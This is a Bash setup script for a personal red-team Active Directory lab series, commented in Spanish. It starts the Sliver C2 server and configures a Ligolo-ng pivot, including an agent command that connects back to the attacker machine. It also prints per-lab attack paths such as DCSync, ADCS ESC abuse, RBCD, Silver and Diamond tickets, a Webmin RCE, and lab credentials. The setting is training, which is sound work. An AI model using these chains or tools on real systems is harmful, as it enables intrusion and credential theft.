#!/bin/bash
# ============================================================
#  RED TEAM OPS ROADMAP — Lab Start Script
#  Autor: Adrián Camacho
#  Uso: ./lab_start.sh [lab-number]
#  Ejemplo: ./lab_start.sh 01
#           ./lab_start.sh 02
#           ./lab_start.sh 03
#
#  Configura el entorno de Kali para el lab especificado:
#    - Verifica IPs de las VMs del lab
#    - Recrea interfaz Ligolo-ng (si aplica)
#    - Arranca Sliver C2
#    - Muestra estado del entorno
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

ok()      { echo -e "    ${GREEN}[+]${NC} $1"; }
info()    { echo -e "    ${YELLOW}[*]${NC} $1"; }
err()     { echo -e "    ${RED}[!]${NC} $1"; }
section() { echo -e "\n${CYAN}[*] $1${NC}"; }

LAB=${1:-"01"}

banner() {
    echo ""
    echo -e "${CYAN}============================================================${NC}"
    echo -e "${CYAN}  RED TEAM OPS ROADMAP — Lab Start${NC}"
    echo -e "${CYAN}  Lab: ${LAB} | $(date '+%Y-%m-%d %H:%M')${NC}"
    echo -e "${CYAN}============================================================${NC}"
    echo ""
}

# ─────────────────────────────────────────────────────────────
# Configuración por lab
# ─────────────────────────────────────────────────────────────
lab_config() {
    case $LAB in
        "01")
            LAB_NAME="GHOST FOREST (APT29)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        "02")
            LAB_NAME="SILENT BRIDGE (APT41)"
            TARGETS=("10.0.2.200:PROD" "10.0.3.150:GIT" "10.0.3.7:PC-01")
            NEEDS_LIGOLO=true
            LIGOLO_NETWORK="10.0.3.0/24"
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        "03")
            LAB_NAME="DARK GATE — ADCS Abuse (APT29)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        "04")
            LAB_NAME="IRON FOREST — WriteDACL DCSync (APT28)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=8443
            ;;
        "05")
            LAB_NAME="SILVER CHAIN — RBCD Shadow Credentials (APT28)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=8443
            ;;
        "06")
            LAB_NAME="BLACK POLICY — Multi-Forest GPO SID History (APT28)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.11:DC-02" "10.0.2.13:DC-03" "10.0.2.14:DC-04" "10.0.2.8:WKSTN-01" "10.0.2.12:WKSTN-02")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=8443
            ;;
        "07")
            LAB_NAME="SHADOW VAULT — LAPS DPAPI (APT28)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=8443
            ;;
        *)
            err "Lab no reconocido: $LAB"
            echo "    Labs disponibles: 01, 02, 03, 04, 05, 06, 07"
            exit 1
            ;;
    esac
}

# ─────────────────────────────────────────────────────────────
# Verificar conectividad con targets
# ─────────────────────────────────────────────────────────────
check_targets() {
    section "Verificando conectividad con targets..."
    local all_ok=true

    for target in "${TARGETS[@]}"; do
        IP="${target%%:*}"
        NAME="${target##*:}"

        # Workstations: usar nxc smb (ICMP bloqueado por firewall tras reinicio)
        # DCs y servidores Linux: usar nmap ping
        if [[ "$NAME" == WKSTN* ]] || [[ "$NAME" == PC* ]]; then
            if nxc smb "$IP" 2>/dev/null | grep -q "SMB"; then
                ok "$NAME ($IP) — accesible via SMB ✅"
            else
                err "$NAME ($IP) — NO responde ❌ — ¿VM encendida? ¿Firewall?"
                err "  Fix: netsh advfirewall firewall add rule name="SMB Allow" protocol=TCP dir=in localport=445 action=allow"
                all_ok=false
            fi
        else
            if nmap -sn -n --unprivileged "$IP" 2>/dev/null | grep -q "Host is up"; then
                ok "$NAME ($IP) — accesible ✅"
            else
                err "$NAME ($IP) — NO responde ❌ — ¿VM encendida?"
                all_ok=false
            fi
        fi
    done

    if [ "$all_ok" = false ]; then
        echo ""
        echo -e "    ${YELLOW}Enciende las VMs necesarias en VirtualBox y vuelve a ejecutar${NC}"
    fi
}

# ─────────────────────────────────────────────────────────────
# Configurar Ligolo-ng (Lab-02 y labs con pivoting)
# ─────────────────────────────────────────────────────────────
setup_ligolo() {
    if [ "$NEEDS_LIGOLO" = true ]; then
        section "Configurando Ligolo-ng..."

        # Verificar que el binario existe
        if [ ! -f "/opt/ligolo/proxy" ]; then
            err "Ligolo-ng no encontrado en /opt/ligolo/ — ejecuta arsenal_setup.sh primero"
            return
        fi

        # Crear interfaz tun si no existe
        if ! ip link show ligolo &>/dev/null; then
            sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null
            sudo ip link set ligolo up
            ok "Interfaz ligolo creada"
        else
            ok "Interfaz ligolo ya existe"
        fi

        # Añadir ruta si no existe
        if ! ip route | grep -q "$LIGOLO_NETWORK"; then
            sudo ip route add "$LIGOLO_NETWORK" dev ligolo 2>/dev/null
            ok "Ruta $LIGOLO_NETWORK añadida via ligolo"
        else
            ok "Ruta $LIGOLO_NETWORK ya existe"
        fi

        echo ""
        info "Para activar el túnel:"
        echo -e "      ${CYAN}/opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601${NC}"
        info "Luego en PROD ejecutar el agent:"
        echo -e "      ${CYAN}/tmp/agent -connect 10.0.2.9:11601 -ignore-cert &${NC}"
    fi
}

# ─────────────────────────────────────────────────────────────
# Arrancar Sliver C2
# ─────────────────────────────────────────────────────────────
setup_sliver() {
    section "Verificando Sliver C2..."

    if ! command -v sliver &>/dev/null; then
        err "Sliver no instalado — ejecuta arsenal_setup.sh primero"
        return
    fi

    if systemctl is-active --quiet sliver 2>/dev/null; then
        ok "Sliver ya está corriendo"
    else
        sudo systemctl start sliver 2>/dev/null
        sleep 2
        if systemctl is-active --quiet sliver 2>/dev/null; then
            ok "Sliver iniciado"
        else
            info "Sliver no como servicio — iniciando manualmente con 'sliver'"
        fi
    fi

    info "Listener HTTPS configurado → puerto $SLIVER_PORT"
    info "Para conectar: sliver"
}

# ─────────────────────────────────────────────────────────────
# Verificar herramientas críticas del lab
# ─────────────────────────────────────────────────────────────
check_tools() {
    section "Verificando herramientas..."

    # Herramientas comunes
    common_tools=("nmap" "evil-winrm" "nxc" "impacket-secretsdump")
    for tool in "${common_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "$tool ✅"
        else
            err "$tool ❌"
        fi
    done

    # Herramientas específicas por lab
    case $LAB in
        "02")
            if [ -f "/opt/ligolo/proxy" ]; then
                ok "ligolo-ng proxy ✅"
            else
                err "ligolo-ng proxy ❌"
            fi
            ;;
        "03")
            if command -v certipy-ad &>/dev/null; then
                ok "certipy-ad ✅"
            else
                err "certipy-ad ❌"
            fi
            if [ -f "/opt/redteam/PetitPotam.py" ]; then
                ok "PetitPotam ✅"
            else
                err "PetitPotam ❌ → descarga: curl -o /opt/redteam/PetitPotam.py https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py"
            fi
            ;;
        "04"|"05")
            if command -v bloodyad &>/dev/null; then
                ok "bloodyad ✅"
            else
                err "bloodyad ❌ → sudo apt install bloodyad"
            fi
            if command -v certipy-ad &>/dev/null; then
                ok "certipy-ad ✅"
            else
                err "certipy-ad ❌"
            fi
            ;;
        "06")
            if command -v bloodyad &>/dev/null; then
                ok "bloodyad ✅"
            else
                err "bloodyad ❌ → sudo apt install bloodyad"
            fi
            if [ -f "/opt/redteam/pyGPOAbuse/pygpoabuse.py" ]; then
                ok "pyGPOAbuse ✅"
            else
                err "pyGPOAbuse ❌ → sudo git clone https://github.com/Hackndo/pyGPOAbuse.git /opt/redteam/pyGPOAbuse"
            fi
            if [ -f "/opt/redteam/windows/DSInternals_module.zip" ]; then
                ok "DSInternals ✅"
            else
                err "DSInternals ❌ → ejecuta arsenal_setup.sh"
            fi
            ;;
        "07")
            if command -v bloodyad &>/dev/null; then
                ok "bloodyad ✅"
            else
                err "bloodyad ❌ → sudo apt install bloodyad"
            fi
            ;;
    esac
}

# ─────────────────────────────────────────────────────────────
# Resumen final
# ─────────────────────────────────────────────────────────────
summary() {
    echo ""
    echo -e "${CYAN}============================================================${NC}"
    echo -e "${CYAN}  Entorno listo — $LAB_NAME${NC}"
    echo -e "${CYAN}============================================================${NC}"
    echo ""

    case $LAB in
        "01")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    ceo.martinez : Direccion2024!"
            echo -e "    backup_svc   : Backup2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores principales:${NC}"
            echo -e "    AS-REP Roasting → ceo.martinez"
            echo -e "    Kerberoasting   → backup_svc"
            echo -e "    DCSync          → ceo.martinez"
            ;;
        "02")
            echo -e "  ${YELLOW}Topología:${NC}"
            echo -e "    Kali(10.0.2.9) → PROD(10.0.2.200) → GIT(10.0.3.150) → PC-01(10.0.3.7)"
            echo ""
            echo -e "  ${YELLOW}Vector de entrada:${NC}"
            echo -e "    CVE-2019-12840 → python3 /tmp/webmin_rce.py"
            echo -e "    Credenciales Git: thomas:iamthegreatest"
            ;;
        "03")
            echo -e "  ${YELLOW}CA objetivo:${NC} AtackCorp-CA @ 10.0.2.10"
            echo ""
            echo -e "  ${YELLOW}Vectores ADCS:${NC}"
            echo -e "    ESC1 → certipy-ad req -upn Administrador@atackcorp.local"
            echo -e "    ESC4 → fin.garcia:Finance2024! (GenericWrite)"
            echo -e "    ESC8 → impacket-ntlmrelayx + PetitPotam"
            ;;
        "04")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    helpdesk.ruiz : Helpdesk2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores principales:${NC}"
            echo -e "    BloodHound CE → WriteDACL fin.garcia sobre dominio"
            echo -e "    Credential hunting → IT-Scripts SMB share"
            echo -e "    WriteDACL → DCSync → hash Administrador"
            echo -e "    ADIDNS WPAD → Responder → NTLMv2"
            ;;
        "05")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    helpdesk.ruiz : Helpdesk2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores principales:${NC}"
            echo -e "    BloodHound CE → GenericWrite fin.garcia sobre iis_svc + WKSTN-01"
            echo -e "    RBCD → S4U2Self/S4U2Proxy → Admin WKSTN-01"
            echo -e "    Shadow Credentials → pywhisker → PKINIT → hash iis_svc"
            echo -e "    Silver Ticket → MSSQLSvc/DC-01:1433"
            echo -e "    Diamond Ticket → krbtgt AES256"
            ;;
        "06")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    helpdesk.ruiz : Helpdesk2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores principales:${NC}"
            echo -e "    Cross-Forest Kerberoasting → corp_svc + ext_svc"
            echo -e "    SID History → DSInternals → child.user = DA atackcorp"
            echo -e "    GPO Abuse → pyGPOAbuse → helpdesk.ruiz admin WKSTN-01"
            echo -e "    Forest Trust → corp.local + ext.local comprometidos"
            echo ""
            echo -e "  ${YELLOW}Forests:${NC} atackcorp.local | corp.local | child.atackcorp.local | ext.local"
            ;;
        "07")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    helpdesk.ruiz : Helpdesk2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores planificados:${NC}"
            echo -e "    LAPS → LAPSToolkit → contrasena admin local"
            echo -e "    DPAPI → SharpDPAPI → credenciales cifradas"
            echo -e "    Shadow Credentials → LSASS dump sin Mimikatz"
            ;;
    esac
    echo ""
}

# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────
banner
lab_config
check_targets
setup_ligolo
setup_sliver
check_tools
summary